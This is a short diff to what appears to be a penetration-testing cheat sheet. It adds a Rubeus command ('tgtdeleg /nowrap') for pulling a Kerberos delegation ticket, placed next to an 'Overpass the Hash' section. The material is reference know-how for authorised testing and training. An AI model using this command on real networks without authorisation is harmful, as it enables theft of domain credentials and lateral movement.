@@ -4631,6 +4631,12 @@ srvinfo
 
 #### Rubeus
 
+### Request a Delegation Ticket
+
+```c
+.\Rubeus.exe tgtdeleg /nowrap
+```
+
 ##### Overpass the Hash
 
 ```c
